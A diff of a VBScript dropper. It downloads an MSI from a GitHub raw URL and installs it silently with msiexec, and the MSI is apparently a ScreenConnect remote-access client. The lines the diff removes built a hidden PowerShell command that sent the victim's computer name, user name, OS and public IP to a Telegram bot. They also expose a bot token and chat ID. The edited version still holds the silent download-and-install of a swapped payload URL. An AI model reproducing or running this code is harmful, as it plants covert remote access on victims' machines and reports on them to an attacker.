@@ -1,9 +1,7 @@
 ' ================== CONFIG ==================
-Dim BOT_TOKEN, CHAT_ID, PACKAGE_URL, TEMP_PATH, TEMP_DIR
+PACKAGE_URL, TEMP_PATH, TEMP_DIR
 
-BOT_TOKEN   = "8643735125:AAHi9ESDyzDDu9veWr7mM7GCIPaYwxxOpTo"
-CHAT_ID     = "8345342738"
-PACKAGE_URL = "https://github.com/Brayan-277/me/raw/refs/heads/main/me.msi"
+PACKAGE_URL = "https://raw.githubusercontent.com/lordbacklink/Screen-01/refs/heads/main/1.msi"
 
 TEMP_DIR  = "C:\Temp"
 TEMP_PATH = TEMP_DIR & "\sc.msi"
@@ -46,25 +44,6 @@ Dim installCmd
 installCmd = "msiexec.exe /i """ & TEMP_PATH & """ /qn /norestart"
 
 intReturn = objShell.Run(installCmd, 0, True)
-
-' ================== TELEGRAM NOTIFICATION ==================
-Dim notifyCmd
-notifyCmd = _
-    "powershell -NoProfile -ExecutionPolicy Bypass -Command " & _
-    """[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" & _
-    "$ip=(Invoke-RestMethod 'https://api.ipify.org');" & _
-    "$os=(Get-CimInstance Win32_OperatingSystem).Caption;" & _
-    "$dt=Get-Date -Format 'yyyy-MM-dd HH:mm:ss';" & _
-    "$msg='=== SCREENCONNECT INSTALLED ==='+[char]10+" & _
-         "'PC: '+$env:COMPUTERNAME+[char]10+" & _
-         "'User: '+$env:USERNAME+[char]10+" & _
-         "'OS: '+$os+[char]10+" & _
-         "'IP: '+$ip+[char]10+" & _
-         "'Time: '+$dt;" & _
-    "$body=@{chat_id='" & CHAT_ID & "';text=$msg};" & _
-    "Invoke-RestMethod -Uri 'https://api.telegram.org/bot" & BOT_TOKEN & "/sendMessage' -Method Post -Body $body"""
-
-objShell.Run notifyCmd, 0, False
 
 ' ================== CLEANUP ==================
 If objFSO.FileExists(TEMP_PATH) Then
